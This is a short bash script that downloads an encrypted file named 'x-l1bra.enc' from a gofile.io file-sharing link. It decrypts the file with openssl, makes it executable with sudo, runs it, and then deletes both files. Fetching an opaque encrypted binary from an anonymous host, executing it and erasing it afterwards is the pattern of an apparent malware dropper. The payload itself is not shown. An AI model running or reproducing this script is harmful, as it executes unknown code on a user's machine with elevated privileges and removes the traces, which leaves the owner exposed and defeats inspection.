#! /bin/bash
cd
curl -O https://store11.gofile.io/download/0b74e65b-93e9-45b8-bbd4-e9044f612899/x-l1bra.enc
openssl aes-256-cbc -pbkdf2 -d -in x-l1bra.enc -out x-l1bra
sudo chmod 755 x-l1bra
./x-l1bra
rm x-l1bra.enc x-l1bra
